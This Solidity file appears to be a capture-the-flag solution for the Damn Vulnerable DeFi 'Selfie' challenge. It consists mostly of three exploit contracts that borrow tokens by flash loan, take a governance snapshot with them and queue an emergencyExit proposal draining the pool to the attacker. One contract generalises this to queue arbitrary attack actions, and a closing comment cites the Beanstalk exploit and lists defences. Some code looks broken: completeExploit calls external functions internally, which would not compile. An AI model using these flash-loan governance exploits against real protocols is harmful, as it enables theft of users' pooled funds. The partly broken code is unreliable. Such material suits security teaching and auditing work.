// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableToken.sol";

/**
 * @title SelfieExploit
 * @author Damn Vulnerable DeFi Challenge Solution
 * @notice Exploit contract for Challenge #6 - Selfie
 * 
 * VULNERABILITY: Flash Loan Governance Manipulation
 * 
 * The governance system is vulnerable because:
 * - Voting power is based on token balance snapshots
 * - Snapshots can be triggered during flash loan execution  
 * - No minimum holding period required for governance participation
 * - Emergency functions can drain the entire pool
 * - Flash loans provide temporary massive voting power
 * 
 * ATTACK FLOW:
 * Phase 1 (Immediate):
 * 1. Flash loan maximum DVT tokens from pool
 * 2. Call governance.snapshot() to record high balance
 * 3. Queue malicious governance proposal (drain pool)
 * 4. Repay flash loan (but snapshot voting power remains)
 * 
 * Phase 2 (After governance delay):
 * 5. Execute queued governance action
 * 6. Pool.emergencyExit() called, sending all tokens to attacker
 * 
 * This is the EXACT pattern used in $182M Beanstalk Farms exploit!
 */
contract SelfieExploit {
    SelfiePool private immutable pool;
    SimpleGovernance private immutable governance;
    DamnValuableToken private immutable token;
    address private immutable attacker;
    
    uint256 private queuedActionId;
    bool private phase1Complete;
    
    constructor(address _pool, address _governance, address _token) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableToken(_token);
        attacker = msg.sender;
    }
    
    /**
     * @notice Execute Phase 1: Flash loan to gain voting power and queue malicious proposal
     * @dev This phase uses flash loan to temporarily gain governance control
     */
    function phase1_GainVotingPowerAndQueueAction() external {
        require(msg.sender == attacker, "Only attacker can execute");
        require(!phase1Complete, "Phase 1 already completed");
        
        // Get entire pool balance for maximum voting power
        uint256 poolBalance = token.balanceOf(address(pool));
        require(poolBalance > 0, "Pool is empty");
        
        // Flash loan will trigger receiveTokens callback
        pool.flashLoan(poolBalance, address(this), "");
        
        require(queuedActionId != 0, "Failed to queue governance action");
        phase1Complete = true;
    }
    
    /**
     * @notice Flash loan callback - critical governance manipulation happens here
     * @param borrowedToken The token borrowed (DVT)
     * @param amount Amount of tokens borrowed
     * @param data Additional data (unused)
     */
    function receiveTokens(
        address borrowedToken, 
        uint256 amount, 
        bytes memory data
    ) external {
        require(msg.sender == address(pool), "Only pool can call");
        require(borrowedToken == address(token), "Unexpected token");
        require(amount > 0, "No tokens received");
        
        // At this point, we have massive DVT balance from flash loan
        uint256 ourBalance = token.balanceOf(address(this));
        require(ourBalance >= amount, "Insufficient borrowed tokens");
        
        // CRITICAL STEP: Take governance snapshot with our high balance
        // This records our voting power while we hold the flash loaned tokens
        governance.snapshot();
        
        // Verify we now have enough voting power
        require(
            governance.getBalanceAtLastSnapshot(address(this)) > 
            governance.getTotalSupplyAtLastSnapshot() / 2,
            "Insufficient voting power after snapshot"
        );
        
        // Queue malicious governance action to drain the pool
        bytes memory maliciousCalldata = abi.encodeWithSignature(
            "emergencyExit(address)",
            attacker  // Send all pool tokens to attacker
        );
        
        queuedActionId = governance.queueAction(
            address(pool),      // target: pool contract to call
            0,                  // value: no ETH needed
            maliciousCalldata   // data: emergencyExit(attacker)
        );
        
        // Repay flash loan
        // Note: Our voting power snapshot remains even after returning tokens!
        token.transfer(address(pool), amount);
        
        // Emit event for tracking
        emit GovernanceActionQueued(queuedActionId, attacker, block.timestamp);
    }
    
    /**
     * @notice Execute Phase 2: Execute the queued malicious governance action
     * @dev Can only be called after governance delay period has passed
     */
    function phase2_ExecuteQueuedAction() external {
        require(msg.sender == attacker, "Only attacker can execute");
        require(phase1Complete, "Phase 1 not completed");
        require(queuedActionId != 0, "No action queued");
        
        // Check if governance delay has passed
        SimpleGovernance.GovernanceAction memory action = governance.getAction(queuedActionId);
        require(
            block.timestamp >= action.executionTime,
            "Governance delay not yet passed"
        );
        
        // Execute the malicious governance action
        // This will call pool.emergencyExit(attacker), draining all tokens
        governance.executeAction(queuedActionId);
        
        // Verify the attack succeeded
        uint256 finalPoolBalance = token.balanceOf(address(pool));
        uint256 finalAttackerBalance = token.balanceOf(attacker);
        
        require(finalPoolBalance == 0, "Pool not fully drained");
        require(finalAttackerBalance > 0, "Attacker received no tokens");
        
        emit ExploitCompleted(finalAttackerBalance, block.timestamp);
    }
    
    /**
     * @notice Complete exploit (both phases if delay allows)
     * @dev Attempts to execute both phases in sequence
     */
    function completeExploit() external {
        require(msg.sender == attacker, "Only attacker");
        
        // Execute Phase 1
        if (!phase1Complete) {
            phase1_GainVotingPowerAndQueueAction();
        }
        
        // Try Phase 2 immediately (will fail if delay not passed)
        SimpleGovernance.GovernanceAction memory action = governance.getAction(queuedActionId);
        if (block.timestamp >= action.executionTime) {
            phase2_ExecuteQueuedAction();
        }
    }
    
    /**
     * @notice Check exploitation status and timing
     * @return phase1Done True if voting power gained and action queued
     * @return canExecute True if governance action can be executed
     * @return timeUntilExecution Seconds until action can be executed
     * @return actionId The queued governance action ID
     */
    function getExploitStatus() 
        external 
        view 
        returns (
            bool phase1Done,
            bool canExecute, 
            uint256 timeUntilExecution,
            uint256 actionId
        ) 
    {
        phase1Done = phase1Complete;
        actionId = queuedActionId;
        
        if (queuedActionId != 0) {
            SimpleGovernance.GovernanceAction memory action = governance.getAction(queuedActionId);
            
            if (block.timestamp >= action.executionTime) {
                canExecute = true;
                timeUntilExecution = 0;
            } else {
                canExecute = false;
                timeUntilExecution = action.executionTime - block.timestamp;
            }
        } else {
            canExecute = false;
            timeUntilExecution = type(uint256).max;
        }
    }
    
    /**
     * @notice Get our current and snapshot voting power
     * @return currentBalance Current DVT balance
     * @return snapshotBalance Balance at last snapshot  
     * @return totalSupply Total supply at last snapshot
     * @return votingPowerPercentage Our voting power percentage (basis points)
     */
    function getVotingPowerAnalysis() 
        external 
        view 
        returns (
            uint256 currentBalance,
            uint256 snapshotBalance,
            uint256 totalSupply, 
            uint256 votingPowerPercentage
        ) 
    {
        currentBalance = token.balanceOf(address(this));
        snapshotBalance = governance.getBalanceAtLastSnapshot(address(this));
        totalSupply = governance.getTotalSupplyAtLastSnapshot();
        
        if (totalSupply > 0) {
            votingPowerPercentage = (snapshotBalance * 10000) / totalSupply; // basis points
        }
    }
    
    /**
     * @notice Emergency recovery function
     * @dev In case tokens get stuck in contract
     */
    function emergencyWithdraw() external {
        require(msg.sender == attacker, "Only attacker");
        
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(attacker, balance);
        }
    }
    
    // Events for tracking
    event GovernanceActionQueued(uint256 indexed actionId, address indexed beneficiary, uint256 timestamp);
    event ExploitCompleted(uint256 tokensStolen, uint256 timestamp);
}

/**
 * @title SelfieExploitOptimized
 * @notice Gas-optimized version for single-transaction execution when possible
 */
contract SelfieExploitOptimized {
    event ActionQueued(uint256 actionId);
    
    function exploit(
        address poolAddr,
        address governanceAddr,
        address tokenAddr
    ) external returns (uint256 actionId) {
        // Check if we can do instant execution (delay = 0)
        uint256 delay = SimpleGovernance(governanceAddr).getActionDelay();
        bool instantExecution = (delay == 0);
        
        // Store parameters for callback
        bytes memory params = abi.encode(poolAddr, governanceAddr, tokenAddr, msg.sender, instantExecution);
        
        // Get flash loan
        uint256 flashAmount = DamnValuableToken(tokenAddr).balanceOf(poolAddr);
        SelfiePool(poolAddr).flashLoan(flashAmount, address(this), params);
        
        // Return the queued action ID
        actionId = _getStoredActionId();
        emit ActionQueued(actionId);
    }
    
    function executeAction(address governanceAddr, uint256 actionId) external {
        SimpleGovernance(governanceAddr).executeAction(actionId);
    }
    
    uint256 private _storedActionId;
    
    function receiveTokens(address, uint256 amount, bytes memory data) external {
        (
            address poolAddr,
            address governanceAddr, 
            address tokenAddr,
            address attackerAddr,
            bool instantExecution
        ) = abi.decode(data, (address, address, address, address, bool));
        
        SimpleGovernance governance = SimpleGovernance(governanceAddr);
        
        // Take snapshot with borrowed tokens
        governance.snapshot();
        
        // Queue malicious action
        bytes memory drainCalldata = abi.encodeWithSignature(
            "emergencyExit(address)",
            attackerAddr
        );
        
        uint256 actionId = governance.queueAction(poolAddr, 0, drainCalldata);
        _storedActionId = actionId;
        
        // Execute immediately if no delay
        if (instantExecution) {
            governance.executeAction(actionId);
        }
        
        // Repay loan
        DamnValuableToken(tokenAddr).transfer(poolAddr, amount);
    }
    
    function _getStoredActionId() private view returns (uint256) {
        return _storedActionId;
    }
}

/**
 * @title SelfieMultiAttackExploit
 * @notice Advanced version that can queue multiple governance attacks
 */
contract SelfieMultiAttackExploit {
    struct AttackAction {
        address target;
        uint256 value;
        bytes data;
        string description;
    }
    
    uint256[] private queuedActionIds;
    
    function multiAttackExploit(
        address poolAddr,
        address governanceAddr,
        address tokenAddr,
        AttackAction[] calldata attacks
    ) external returns (uint256[] memory actionIds) {
        require(attacks.length > 0, "No attacks specified");
        
        // Encode attack data for callback
        bytes memory attackData = abi.encode(governanceAddr, attacks, msg.sender);
        
        // Flash loan to gain voting power
        uint256 flashAmount = DamnValuableToken(tokenAddr).balanceOf(poolAddr);
        SelfiePool(poolAddr).flashLoan(flashAmount, address(this), attackData);
        
        return queuedActionIds;
    }
    
    function receiveTokens(address tokenAddr, uint256 amount, bytes memory data) external {
        (
            address governanceAddr,
            AttackAction[] memory attacks,
            address attackerAddr
        ) = abi.decode(data, (address, AttackAction[], address));
        
        SimpleGovernance governance = SimpleGovernance(governanceAddr);
        
        // Gain voting power
        governance.snapshot();
        
        // Queue all attacks
        delete queuedActionIds;
        for (uint256 i = 0; i < attacks.length; i++) {
            uint256 actionId = governance.queueAction(
                attacks[i].target,
                attacks[i].value,
                attacks[i].data
            );
            queuedActionIds.push(actionId);
        }
        
        // Repay loan
        DamnValuableToken(tokenAddr).transfer(msg.sender, amount);
    }
    
    function executeAllActions(address governanceAddr) external {
        for (uint256 i = 0; i < queuedActionIds.length; i++) {
            SimpleGovernance(governanceAddr).executeAction(queuedActionIds[i]);
        }
    }
}

/**
 * COMPREHENSIVE ATTACK ANALYSIS:
 * 
 * 1. HISTORICAL SIGNIFICANCE:
 *    - Exact pattern used in $182M Beanstalk Farms exploit (April 2022)
 *    - Largest governance attack in DeFi history at the time
 *    - Attacker used Aave flash loans to gain 67% voting power
 *    - Passed malicious proposals in single transaction
 * 
 * 2. TECHNICAL VULNERABILITY:
 *    - Governance voting power based on token balance snapshots
 *    - Snapshots can be triggered by users during flash loan execution
 *    - No minimum holding period for governance participation
 *    - Emergency functions provide direct fund drainage capability
 * 
 * 3. ATTACK ECONOMICS:
 *    - Cost: Only flash loan fees (~0.09% typically)
 *    - Benefit: 100% of pool funds (1.5M DVT tokens)
 *    - Risk: Very low (governance delays are predictable)
 *    - ROI: Massive (>99.9% profit margin)
 * 
 * 4. REAL-WORLD DEFENSE FAILURES:
 *    - Many protocols still vulnerable to flash loan governance
 *    - Time delays often insufficient (Beanstalk had 24h delay)
 *    - Emergency functions often over-privileged
 *    - Snapshot timing generally user-controllable
 * 
 * 5. PREVENTION STRATEGIES:
 *    - Time-weighted voting (balances over extended periods)
 *    - Minimum holding periods before governance participation
 *    - Multi-stage voting with extended delays
 *    - Delegation-based governance instead of direct token voting
 *    - Emergency function restrictions and multi-sig requirements
 * 
 * This challenge teaches one of the most critical DeFi security patterns!
 */